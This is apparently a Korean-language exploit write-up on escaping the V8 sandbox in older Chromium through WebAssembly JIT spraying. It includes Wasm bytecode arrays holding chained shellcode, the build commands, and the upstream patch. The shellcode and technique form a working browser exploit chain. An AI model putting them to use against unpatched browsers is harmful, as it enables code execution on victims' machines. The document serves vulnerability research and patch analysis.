# Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium < 122.0.6261.57, V8 < 12.2.170)

## Setup

- Ubuntu 22.04.5 LTS
- [8cf17a14a78cc1276eb42e1b4bb699f705675530](https://chromium.googlesource.com/v8/v8/+/8cf17a14a78cc1276eb42e1b4bb699f705675530) (2024.01.04.)

[setup.zsh](./setup.zsh)

## Analysis

### Function in WebAssembly module

```js
/*
(module
    (func (export "f1"))
    (func (export "f2"))
    (func (export "f3"))
    (func (export "f4"))
)
*/
let wasm_code = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x5, 0x4, 0x0, 0x0, 0x0, 0x0, 0x7, 0x15, 0x4, 0x2, 0x66, 0x31, 0x0, 0x0, 0x2, 0x66, 0x32, 0x0, 0x1, 0x2, 0x66, 0x33, 0x0, 0x2, 0x2, 0x66, 0x34, 0x0, 0x3, 0xa, 0xd, 0x4, 0x2, 0x0, 0xb, 0x2, 0x0, 0xb, 0x2, 0x0, 0xb, 0x2, 0x0, 0xb]);
let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);

% DebugPrint(wasm_instance);
```

`wasm_module`은 4개의 함수를 가지고 있는 Wasm module이다. Wasm module이 생성되면 함수들의 코드를 저장하기 위해 RWX permission이 설정된 영역이 할당되고, 이 영역의 가장 앞쪽에 jump table이 생성된다.

![image](https://github.com/user-attachments/assets/e30c79f2-b68b-41ad-95bb-83723fddd78c)

![image](https://github.com/user-attachments/assets/038e612e-47c1-4e32-ac37-4eaed3dad44f)

Jump table은 특정 함수가 호출되었을 때 execution flow를 어디로 옮겨야 하는지에 대한 정보를 담고 있다. Module이 생성된 후 함수가 최초로 호출되면 위와 같이 `Builtins_WasmCompileLazy()`로 jump하여 lazy compilation을 진행한다.

![image](https://github.com/user-attachments/assets/8cb8389e-668e-45a7-9be7-8bc52db395ba)

두 번째 호출부터는 바로 compile된 코드로 jump하여 실행한다.

## Exploitation

### JIT (just-in-time) spraying

```js
/*
(module
    (func (export "main")
        i64.const 0x4141414141414141
        i64.const 0x4242424242424242
        i64.const 0x4343434343434343
        return
    )
)
*/
let wasm_code = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x26, 0x1, 0x24, 0x0, 0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x0, 0x42, 0xc2, 0x84, 0x89, 0x92, 0xa4, 0xc8, 0x90, 0xa1, 0xc2, 0x0, 0x42, 0xc3, 0x86, 0x8d, 0x9a, 0xb4, 0xe8, 0xd0, 0xa1, 0xc3, 0x0, 0xf, 0xb]);
let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);

wasm_instance.exports.main();
% DebugPrint(wasm_instance);
```

![image](https://github.com/user-attachments/assets/0b187d48-a91e-426c-933f-085ab655df7f)

![image](https://github.com/user-attachments/assets/5ab468cc-85f0-4a24-88c6-cba4c6376f27)

`const` instruction으로 number를 load하는 코드를 JIT compile하면 `const`의 operand가 코드에 raw numer로 삽입된다. `WasmInstanceObject`는 RWX 영역의 시작 주소인 `jump_table_start`를 8-byte full pointer로 가지고 있는데, 이 object는 V8 sandbox 내부에 위치하기 때문에 arbitrary address write primitive가 있으면 `jump_table_start`를 조작하여 `rip`를 control할 수 있다. `rip`를 코드에 삽입된 raw number의 주소(e.g. `0x3aa5e28bb84f`)로 옮기면 해당 raw number가 8바이트 길이의 shellcode로 동작하게 된다. 

### Constructing shellcode chain

8바이트 길이의 shellcode로는 원하는 코드를 실행할 수 없을 가능성이 높다. 삽입되는 raw number들 간의 거리는 `0xff`를 초과하지 않기 때문에 shellcode의 마지막 2바이트에 `jmp` instruction을 넣어서 다음 shellcode로 jump하도록 하여 shellcode chain을 구성할 수 있다.

[shellcode.py](./shellcode.py)

```shell
$ python3 shellcode.py > pwn.wat
$ ~/wabt/bin/wat2wasm pwn.wat # output: pwn.wasm
$ python3 wasm.py               
[0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0xb1, 0x1, 0x1, 0xae, 0x1, 0x0, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xe6, 0xf0, 0xb2, 0x9b, 0x86, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xb8, 0xdf, 0xe0, 0x9b, 0x96, 0x8c, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x82, 0x83, 0x87, 0x82, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x8a, 0xbc, 0x91, 0x96, 0xcd, 0xdb, 0xf5, 0x2, 0x42, 0xd0, 0x90, 0xa5, 0xbc, 0x8e, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0xe2, 0xd8, 0x87, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xe6, 0xf0, 0xea, 0x81, 0x83, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xb8, 0x99, 0x85, 0xca, 0xd5, 0x87, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x82, 0x83, 0x87, 0x82, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x8a, 0x90, 0xca, 0xb4, 0x8a, 0xd4, 0xf5, 0x2, 0x42, 0xd0, 0x90, 0xa5, 0x84, 0x8e, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0xe2, 0xec, 0x9e, 0x85, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x92, 0x8a, 0x87, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0xbb, 0x87, 0xe4, 0xf5, 0x2, 0x42, 0x8f, 0x8a, 0xc0, 0x84, 0x89, 0x92, 0xa4, 0xc8, 0x90, 0x7f, 0xf, 0xb]
```

![image](https://github.com/user-attachments/assets/5469f1e9-a5f4-4617-9c04-58873a4723e2)

만들어진 shellcode array에 위와 같이 중복되는 값이 있는 경우 register에 저장했다가 재사용하도록 compile되기 때문에 shellcode가 동작하지 않는다. 따라서 코드의 순서를 바꾸거나 `nop`의 위치를 옮겨서 중복되는 값이 없도록 만들어야 한다. 또한, 가용한 register가 없는 경우 register에 저장된 값을 stack에 백업하는 코드가 추가되기 때문에 shellcode 간의 거리가 변하는 것을 고려하여 `jmp`의 operand를 조절해 주어야 한다.

[pwn.wat](./pwn.wat)

```shell
$ ~/wabt/bin/wat2wasm pwn.wat # output: pwn.wasm
$ python3 wasm.py
[0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0xb1, 0x1, 0x1, 0xae, 0x1, 0x0, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xe6, 0xf0, 0xb2, 0x9b, 0x86, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xb8, 0xdf, 0xe0, 0x9b, 0x96, 0x8c, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x82, 0x83, 0x87, 0x82, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x8a, 0xbc, 0x91, 0x96, 0xcd, 0xdb, 0xf5, 0x2, 0x42, 0xd0, 0x90, 0xa5, 0xbc, 0x8e, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0xe2, 0xd8, 0x87, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0x90, 0x91, 0xc5, 0x81, 0x8c, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xe6, 0xf0, 0xea, 0x81, 0x83, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xb8, 0x99, 0x85, 0xca, 0xd5, 0x87, 0xe4, 0xf5, 0x6, 0x42, 0x90, 0x91, 0x85, 0x86, 0x8e, 0x84, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0x8a, 0x90, 0xca, 0xb4, 0x8a, 0xd4, 0xf5, 0x6, 0x42, 0xd0, 0x90, 0xa5, 0x84, 0x8e, 0x92, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0xe2, 0xec, 0x9e, 0x85, 0x8a, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0x92, 0x8a, 0x87, 0x89, 0x92, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0xbb, 0x87, 0xe4, 0xf5, 0x6, 0x42, 0x8f, 0x8a, 0xc0, 0x84, 0x89, 0x92, 0xa4, 0xc8, 0x90, 0x7f, 0xf, 0xb]
```

[pwn.js](./pwn.js)

![image](https://github.com/user-attachments/assets/b3a07117-565b-4eb4-850c-7e31572fc3cb)

## Patch

> [[wasm] Introduce WasmTrustedInstanceData](https://chromium.googlesource.com/v8/v8/+/59acab802a319da23c1c005e062fbc2bab4d348b) (2024.01.04.)
>
> This CL moves most data from the WasmInstanceObject to a new WasmTrustedInstanceData. As the name suggests, this new object is allocated in the trusted space and can hence hold otherwise-unsafe data (like direct pointers). As the Wasm instance was still storing some unsafe pointers, this CL closes holes in the V8 sandbox, and allows us to land follow-up refactorings to remove more indirections for sandboxing (potentially after moving more data structures to the trusted space).
